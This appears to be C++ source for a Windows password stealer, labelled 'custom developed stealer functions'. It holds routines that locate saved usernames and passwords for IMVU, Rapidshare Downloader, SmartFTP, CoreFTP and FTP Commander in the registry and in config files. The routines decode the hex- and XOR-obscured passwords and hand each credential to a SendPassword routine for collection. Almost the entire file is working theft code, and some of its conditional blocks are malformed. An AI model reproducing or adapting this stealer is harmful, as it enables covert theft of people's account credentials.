
// custom developed stealer functions

#include "Windows.h"
#include "Config.h"
#include "Functions.h"


int GetIMVU()
{
	char UserName[UserPasswordLength], PasswordHex[UserPasswordLength], Password[UserPasswordLength] = "";

	if (!ReadKeyData(HKEY_CURRENT_USER, "Software\\IMVU\\username", NULL, UserName) ||
	    !ReadKeyData(HKEY_CURRENT_USER, "Software\\IMVU\\password", NULL, PasswordHex))
		return 0;

    // convert from hex string to real string
    for (unsigned n = 0; PasswordHex[n] != 0 && PasswordHex[n+1] != 0; n += 2)
    {
        char HexNumber[3];
        HexNumber[0] = PasswordHex[n];
        HexNumber[1] = PasswordHex[n + 1];
        HexNumber[2] = 0;

        Password[n / 2] = (char)strtol(HexNumber, NULL, 16);
        Password[n / 2 + 1] = 0;
    }

	SendPassword(Password_IMVU, "", UserName, Password);

	return 1;
}


int GetRapidshareDownloader()
{
    char Path[MAX_PATH];
    if (!GetPathFromRegistryEntry(Path, HKEY_CLASSES_ROOT, "Rapidshare Downloader File\\Shell\\Open\\Command"))
        return 0;

    strcat(Path, "settings.txt");

    char * Settings;
    DWORD FileSize;
    if (!ReadFileData(Path, &Settings, &FileSize))
        return 0;

    // skip 6 CR/LFs in the config to get to the user and +1 for the password
    char * User = Settings;
    char * Password;

    for (int n = 0; n < 6; n++)
    {
        User = strstr(User, "\r\n");
        if (!User)
            return 0;
        User += 2;
    }

    Password = strstr(User, "\r\n");
    *Password = '\0';
    Password += 2;
    *strstr(Password, "\r\n") = '\0';

    SendPassword(Password_Rapidshare, "", User, Password);
    return 1;
}


int GetSmartFTP(char * AppDataLocal)
{
    char * SmartFTP = new char[MAX_PATH];
    strcpy(SmartFTP, AppDataLocal);
    strcat(SmartFTP, "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\");

    if (GetFileAttributesA(SmartFTP) == INVALID_FILE_ATTRIBUTES)
        return 0;

    // look for all *.xml files
    char SearchString[MAX_PATH];
    strcpy(SearchString, SmartFTP);
    strcat(SearchString, "*.xml");
    WIN32_FIND_DATAA FoundFile;
    HANDLE CurrentFile = FindFirstFileA(SearchString, &FoundFile);
    if (!CurrentFile)
        return 0;

    while (1)
    {
        char XmlFile[MAX_PATH];
        strcpy(XmlFile, SmartFTP);
        strcat(XmlFile, FoundFile.cFileName);

        char * XmlData;
        DWORD FileSize;

        if (!ReadFileData(XmlFile, &XmlData, &FileSize))
            return 0;

        char Host[UserPasswordLength], User[UserPasswordLength], Password[UserPasswordLength], Port[10], Name[UserPasswordLength];

        if (!Cut(Host, XmlData, "<Host>", "</Host>") ||
            !Cut(Port, XmlData, "<Port>", "</Port>") ||
            !Cut(User, XmlData, "<User>", "</User>") ||
            !Cut(Password, XmlData, "<Password>", "</Password>") ||
            !Cut(Name, XmlData, "<Name>", "</Name>"))

        if (strcmp(Port, "21") != 0)
        {
            strcat(Host, ":");
            strcat(Host, Port);
        }

        strcat(Password, " (encrypted)");

        // maybe adding Name here?


        SendPassword(Password_SmartFTP, Host, User, Password);


        // next file
        if (!FindNextFileA(CurrentFile, &FoundFile))
            break;
    }

    return 1;
}


int GetCoreFTP()
{
	HKEY hKey = 0;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\FTPWare\\COREFTP\\Sites", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return 0;

    DWORD dwSubKeys;
    char SubKey[MAX_PATH];

	if (RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &dwSubKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
        return 0;

    for (DWORD i = 0; i < dwSubKeys; i++)
    {
			
		DWORD SubKeyLen = sizeof(SubKey);
		if (RegEnumKeyExA(hKey, i, SubKey, &SubKeyLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            return 0;
			
        char FinalSubKey[MAX_PATH];
        strcpy(FinalSubKey, "Software\\FTPWare\\COREFTP\\Sites\\");
        strcat(FinalSubKey, SubKey);

        char Host[UserPasswordLength], User[UserPasswordLength], Password[UserPasswordLength], Port[10], Name[UserPasswordLength];

        if (!ReadKeyData(HKEY_CURRENT_USER, FinalSubKey, "Host", Host) ||
            !ReadKeyData(HKEY_CURRENT_USER, FinalSubKey, "User", User) ||
            !ReadKeyData(HKEY_CURRENT_USER, FinalSubKey, "Port", Port) ||
            !ReadKeyData(HKEY_CURRENT_USER, FinalSubKey, "Name", Name) ||
            !ReadKeyData(HKEY_CURRENT_USER, FinalSubKey, "PW", Password))


        if (strcmp(Port, "21") != 0)
        {
            strcat(Host, ":");
            strcat(Host, Port);
        }

        strcat(Password, " (encrypted)");

        // maybe adding Name here?

        SendPassword(Password_CoreFTP, Host, User, Password);
	}
		
	RegCloseKey (hKey);

	return 1;
}


int GetFTPCommander(char * ProgramDirectory)
{
    char * Ftplist = new char[MAX_PATH];
    strcpy(Ftplist, ProgramDirectory);
    strcat(Ftplist, "\\FTP Commander\\");

    // In case of failure get the string from the registry:
    // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FTP Commander\UninstallString = C:\Programs\FTP Commander\uninstall.exe

    if (GetFileAttributesA(Ftplist) == INVALID_FILE_ATTRIBUTES && !GetPathFromRegistryEntry(Ftplist, HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Commander", "UninstallString") && 
        GetFileAttributesA(Ftplist) == INVALID_FILE_ATTRIBUTES)
        return 0;

    strcat(Ftplist, "Ftplist.txt");
    char * Data;
    DWORD FileSize;

    if (!ReadFileData(Ftplist, &Data, &FileSize))
        return 0;

    // skip the default entries
    int Entry = FindString(Data, FileSize, "Supercomputers", 0);
    if (Entry)
        Entry = FindString(Data, FileSize, "\r\n", Entry) + 2;

    while (1)
    {
        char Host[UserPasswordLength], User[UserPasswordLength], Password[UserPasswordLength], Port[10], Name[UserPasswordLength];

        if (!Cut(Host, Data + Entry, "Server=", ";") ||
            !Cut(Port, Data + Entry, "Port=", ";") ||
            !Cut(User, Data + Entry, "User=", ";") ||
            !Cut(Password, Data + Entry, "Password=", ";") ||
            !Cut(Name, Data + Entry, "Name=", ";"))
            return 1;

        if (strcmp(Port, "21") != 0)
        {
            strcat(Host, ":");
            strcat(Host, Port);
        }

        // decrypt the password (simple xor with 19h)
        unsigned PasswordLength = strlen(Password);
        for (int n = 0; Password[n]; n++)
            Password[n] ^= 0x19;

        // maybe adding Name here?

        SendPassword(Password_FTPCommander, Host, User, Password);

        Entry = FindString(Data, FileSize, "\r\n", Entry);
        if (!Entry)
            break;
        Entry += 2;
    }

    return 1;
}
